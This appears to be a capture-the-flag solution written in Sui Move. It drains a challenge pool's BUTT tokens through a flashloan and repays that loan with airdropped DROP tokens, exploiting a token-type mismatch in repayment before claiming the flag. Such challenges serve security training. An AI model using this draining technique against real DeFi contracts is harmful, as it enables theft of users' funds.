// PackageID: 0x52477ed568492c0b9208a35e64ee4e643bce71f24478295b8ac1d2c16355879f
module solve_week2::solve_week2 {
    use std::string::String;
    use sui::coin;
    use week2::butt::{MintBUTT, BUTT};
    use week2::challenge::{create_challenge, get_pool_mut, claim_drop, get_flag, is_solved};
    use week2::drop::{MintDROP, DROP};
    use week2::lp::LP;
    use week2::pool::CreatePoolCap;

    #[allow(lint(self_transfer))]
    public fun solve(
        mint_butt: MintBUTT<BUTT>,
        mint_drop: MintDROP<DROP>,
        create_cap: CreatePoolCap<LP>,
        github_id: String,
        ctx: &mut TxContext,
    ) {
        // 1. Create and get the challenge object.
        let mut challenge_obj = create_challenge(mint_butt, mint_drop, create_cap, ctx);

        // 2. Get the airdrop (Coin<DROP>).
        // This is done BEFORE getting a mutable reference of the internal pool to avoid a borrowing conflict.
        let mut airdrop_drop_coin = claim_drop(&mut challenge_obj, ctx);

        // Get a mutable reference to the Pool object nested within the Challenge.
        let pool_mut_ref = get_pool_mut(&mut challenge_obj);

        let initial_butt_in_pool = week2::pool::balance_of<LP, BUTT>(pool_mut_ref);

        // 3. Borrow flashloan with BUTT
        let (borrowed_butt_coin, flash_receipt_butt) =
            week2::pool::flashloan<LP, BUTT>(pool_mut_ref, initial_butt_in_pool, ctx);

        let required_repay_amount = 1050;
        // assert!(coin::value(&airdrop_drop_coin) == required_repay_amount, 1);

        // 4. Repay flashloan with DROP
        let final_repay_coin_drop = coin::split(&mut airdrop_drop_coin, required_repay_amount, ctx);
        week2::pool::repay_flashloan<LP, DROP>(
            pool_mut_ref,
            flash_receipt_butt,
            final_repay_coin_drop
        );

        transfer::public_transfer(borrowed_butt_coin, tx_context::sender(ctx));
        transfer::public_transfer(airdrop_drop_coin, tx_context::sender(ctx));

        // 5. Call `get_flag()` to get the flag.
        get_flag(&mut challenge_obj, github_id, ctx);
        transfer::public_share_object(challenge_obj);
    }
}